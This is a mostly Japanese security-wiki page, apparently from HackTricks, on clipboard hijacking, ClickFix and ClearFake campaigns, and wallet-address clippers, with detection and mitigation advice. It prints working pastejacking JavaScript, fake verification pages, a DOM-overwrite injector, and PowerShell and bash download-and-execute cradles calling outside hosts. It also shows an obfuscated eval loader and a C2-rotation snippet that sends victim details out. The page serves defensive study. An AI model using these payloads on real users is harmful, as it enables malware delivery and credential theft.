# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – *pastejacking* としても知られる – は、ユーザーが内容を確認せずにコマンドをコピー＆ペーストする習慣を悪用する。悪意のある web ページ（または Electron や Desktop application のような JavaScript 実行可能なコンテキスト）は、プログラム的に attacker-controlled なテキストを system clipboard に入れる。被害者は、通常は巧妙に作られた social-engineering の指示によって、**Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すか、terminal を開いて clipboard の内容を *paste* するよう誘導され、その結果、任意のコマンドが即座に実行される。

**ファイルはダウンロードされず、attachment も開かれない** ため、この手法は attachment、macros、または direct command execution を監視する多くの e-mail および web-content security controls を回避する。したがって、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer のような commodity malware families を配布する phishing campaigns でよく使われる。

## Wallet-address replacement clippers

別の **clipboard hijacking** の変種は、コマンドを貼り付けるのではなく、被害者が **cryptocurrency wallet address** をコピーするまで待ち、貼り付け直前にそれを attacker-controlled なアドレスへ静かに差し替える。これは、ユーザーが先頭/末尾の文字だけを確認することが多いため、長い wallet format に対して特に有効である。

実際の典型的な特徴:
- **Thin loader + nested payload**: 表示される app/exe は正当な trading または "profit" tool に見えるが、本物の clipper は bundle のより深い場所に隠されている（たとえば、.NET loader が nested Rust payload を起動する）。
- **Regex-driven replacement**: malware は `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`、あるいは一般的な **44-character Solana-like** 文字列のような文字列を一致させ、それを attacker wallets に書き換える。
- **Wallet rotation at scale**: modern Windows samples は、単一の static address の代わりに、通貨ごとに **thousands** の replacement wallets を埋め込むことがあり、各 theft 後の wallet reputation burn を減らす。

### Windows clipper flow

一般的な実装は、**`AddClipboardFormatListener`** で登録された hidden window である。各 clipboard update ごとに、malware は通常次を呼び出す:
- **`OpenClipboard`** → 現在の clipboard data にアクセスする。
- **`GetClipboardData`** → text を読み取る。
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string を attacker の値に置き換える。

clippers でよく見られる最小限の hunting regexes:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
ユーザーレベルの永続化で十分に影響を与えられます。観測されたパターンの一つは以下です:
- ペイロードを **`%APPDATA%\silke\silke.exe`** にコピーする
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 配下に **Startup-folder LNK** を作成する

検知のアイデア:
- **`%APPDATA%`** とユーザーの **Startup** フォルダへの書き込みを行いながら、clipboard APIs を継続的に呼び出すプロセス。
- 新しい LNK/executable の作成後に wallet-address clipboard の書き換えが続く。
- 多数の未使用ファイルと、ネストされた binary を起動する小さな launcher を含む archive や偽ソフトウェアの bundle。

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS では、いくつかの campaign が **`unlocker.command`** ヘルパーを配布し、Gatekeeper がアプリを damaged だと言うか、unidentified developer からだと言う場合に、被害者へ右クリック → **Open** を行うよう指示します。スクリプトは単純に quarantine を削除し、近くの `.app` を起動します:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
これは **Gatekeeper exploit** ではありません。Gatekeeper の判定が `com.apple.quarantine` xattr に依存していることを悪用する、**ソーシャルエンジニアリングによる quarantine bypass** です。

実行後、clipper は次を書き込むことで現在のユーザーとして永続化できます:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` と `KeepAlive` を持つ LaunchAgent

有用な防御上の詳細として、いくつかのサンプルは **self-healing watchdog** を実装しており、約30秒ごとに LaunchAgent と wrapper を再書き込みします。`plist` を最初に削除しても **実行中のプロセスを kill しない** と、マルウェアが即座に再作成する可能性があります。安全なクリーンアップ順序:
1. アクティブな clipper プロセスを kill する。
2. LaunchAgent の `plist` を unload/delete する。
3. `~/launch.sh` とコピーされた payload を削除する。

### 配布メモ: 影響力を増幅する fake reputation

このファミリーでは、マルウェア自体は技術的に単純なままでも、**distribution layer** が主要な役割を担います: fake GitHub stars/forks、SourceForge のレビュー/ダウンロード、YouTube のチュートリアルコメント/視聴数、そして無害に見える VirusTotal のコメント/投票が、実行前に binary を信頼できるものに見せるために使われます。

## 強制 copy ボタンと hidden payloads (macOS one-liners)

一部の macOS infostealers は installer site（例: Homebrew）をクローンし、**“Copy” ボタンの使用を強制**して、ユーザーが表示されているテキストだけを選択できないようにします。clipboard entry には想定された installer command に加えて Base64 payload が追記されており（例: `...; echo <b64> | base64 -d | sh`）、1回の paste で両方が実行され、UI は追加の stage を隠します。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
古いキャンペーンでは `document.execCommand('copy')` を使っていましたが、新しいものは非同期の **Clipboard API** (`navigator.clipboard.writeText`) に依存しています。

## The ClickFix / ClearFake Flow

1. ユーザーが typo squatted されたサイトまたは侵害されたサイトを訪問する（例: `docusign.sa[.]com`）
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64 エンコードされた PowerShell の one-liner をクリップボードに密かに保存する。
3. HTML の手順で被害者に次のように指示する: *“**Win + R** を押してコマンドを貼り付け、Enter を押して問題を解決してください。”*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意ある DLL を含むアーカイブをダウンロードする（classic DLL sideloading）。
5. ローダーが追加のステージを復号し、shellcode を inject して persistence をインストールする（例: scheduled task） – 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) は、そのディレクトリ内で `msvcp140.dll` を検索する。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ (`data_3.bin`, `data_4.bin`) をダウンロードし、ローリング XOR キー `"https://google.com/"` を使ってそれらを復号し、最終的な shellcode を注入し、**client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に展開する。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** で `la.txt` をダウンロード
2. **cscript.exe** 内で JScript ダウンローダーを実行
3. MSI ペイロードを取得 → 署名済みアプリケーションの横に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.

### MSHTA 経由の Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 呼び出しは、`PartyContinued.exe` を取得し、`Boat.pst`（CAB）を抽出し、`extrac32` とファイル連結によって `AutoIt3.exe` を再構築し、最後にブラウザ認証情報を `sumeriavgv.digital` に exfiltrates する `.a3x` スクリプトを実行する hidden PowerShell script を起動する。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix campaigns はファイルのダウンロードを完全に省略し、被害者に one-liner を貼り付けるよう指示して、WSH 経由で JavaScript を取得して実行し、それを persist させ、C2 を毎日 rotate する。観測された chain の例:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主要な特徴
- URLは実行時に逆順へ復元され、安易な確認を回避するように難読化されている。
- JavaScriptはStartup LNK（WScript/CScript）経由で自己永続化し、現在の日付に基づいてC2を選択することで、迅速なドメインローテーションを可能にしている。

日付に基づいてC2をローテーションするために使われる最小のJS断片:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、一般的に永続化を確立し、RAT（例: PureHVNC）を取得する loader を展開し、TLS をハードコードされた証明書に pinning し、通信をチャンク化することが多いです。

この亜種に特有の検知アイデア
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または `cscript.exe`）。
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` にある、`%TEMP%`/`%APPDATA%` 配下の JS path を `WScript`/`CScript` で呼び出す LNK。
- Registry/RunMRU と command-line telemetry に `.split('').reverse().join('')` または `eval(a.responseText)` が含まれる。
- 長い command lines を使わずに長い scripts を渡すための、`powershell -NoProfile -NonInteractive -Command -` を繰り返し実行し、大きな stdin payloads を送る挙動。
- その後、`regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のような LOLBins を、アップデーター風の task/path（例: `\GoogleSystem\GoogleUpdater`）配下で実行する Scheduled Tasks。

Threat hunting
- 日次でローテーションする C2 hostnames と URLs に、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` パターンがある。
- clipboard write events の後に Win+R への paste、続いて直ちに `powershell.exe` が実行される流れを相関させる。


Blue-team は clipboard、process-creation、registry telemetry を組み合わせて、pastejacking abuse を特定できます:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持します – 異常な Base64 / obfuscated entries を探してください。
* Security Event ID **4688** (Process Creation) で `ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれるもの。
* Event ID **4663** で、疑わしい 4688 イベントの直前に `%LocalAppData%\Microsoft\Windows\WinX\` または temporary folders 配下に作成された file。
* EDR clipboard sensors（あれば）– `Clipboard Write` の直後に新しい PowerShell process が起動したものを相関させる。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近の campaigns では、偽の CDN/browser verification pages（"Just a moment…"、IUAM-style）を大量生成し、ユーザーに clipboard から OS-specific な commands を native consoles に貼り付けさせます。これにより実行は browser sandbox の外に移り、Windows と macOS の両方で動作します。

builder-generated pages の主な特徴
- `navigator.userAgent` による OS detection で payloads を調整（Windows PowerShell/CMD vs. macOS Terminal）。対応外 OS には見せかけ用の decoys/no-ops を用意して、見た目を維持する。
- 見た目の UI 操作（checkbox/Copy）で自動的に clipboard-copy し、表示テキストは clipboard content と異なる場合がある。
- mobile blocking と、段階的な instructions を含む popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter。
- オプションの obfuscation と single-file injector により、侵害された site の DOM を Tailwind-styled な verification UI で上書きする（新しい domain registration は不要）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS の初回実行の永続化
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使うと、ターミナルを閉じた後も実行が継続し、目に見える痕跡を減らせます。

侵害されたサイト上でのインプレースページ乗っ取り
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style ルアーに特有の検知・ハンティングのアイデア
- Web: Clipboard API を verification widget に結び付けるページ; 表示テキストと clipboard ペイロードの不一致; `navigator.userAgent` による分岐; 疑わしい文脈での Tailwind + 単一ページ置換。
- Windows endpoint: ブラウザ操作の直後に `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` から実行される batch/MSI installer。
- macOS endpoint: Terminal/iTerm がブラウザイベントの近くで `bash`/`curl`/`base64 -d` を起動し、`nohup` を伴う; terminal を閉じても残る background jobs。
- `RunMRU` の Win+R history と clipboard writes を、その後の console process creation と相関させる。

支援技術については also see

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix の進化形 (ClearFake, Scarlet Goldfinch)

- ClearFake は引き続き WordPress sites を侵害し、loader JavaScript を注入して external hosts (Cloudflare Workers, GitHub/jsDelivr) を連鎖させ、さらには blockchain の “etherhiding” calls（例: `bsc-testnet.drpc[.]org` のような Binance Smart Chain API endpoints への POST）まで用いて、現在の lure logic を取得する。最近の overlay は fake CAPTCHA を多用し、何かを download させる代わりに、1 行コマンドを copy/paste するようユーザーに指示する (T1204.004)。
- 初期実行はますます signed script hosts/LOLBAS に委ねられている。2026 年 1 月の chain では、以前の `mshta` の使用が、`WScript.exe` 経由で実行される組み込みの `SyncAppvPublishingServer.vbs` に置き換えられ、aliases/wildcards を使った PowerShell-like arguments を渡して remote content を取得するようになった:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V に使用される；`WScript.exe` と組み合わされ、通常でない引数（`gal`/`gcm` エイリアス、ワイルドカード付き cmdlets、jsDelivr URLs）を伴うと、ClearFake のための高シグナルな LOLBAS ステージになる。
- 2026年2月の fake CAPTCHA payloads は、純粋な PowerShell download cradles に戻った。ライブの例は2つ：
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 最初の chain は in-memory の `iex(irm ...)` grabber で、2つ目は `WinHttp.WinHttpRequest.5.1` 経由で stage し、一時 `.ps1` に書き込み、その後 hidden window で `-ep bypass` を付けて起動する。

これらの variant の detection/hunting tips
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` または、clipboard 書き込み/Win+R の直後に PowerShell cradles。
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains、または raw IP の `iex(irm ...)` patterns。
- Network: web browsing の直後に、script hosts/PowerShell から CDN worker hosts や blockchain RPC endpoints への outbound。
- File/registry: `%TEMP%` 配下での一時 `.ps1` 作成と、これらの one-liners を含む RunMRU entries；外部 URLs や obfuscated alias strings を使って signed-script LOLBAS（WScript/cscript/mshta）が実行されたら block/alert。

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
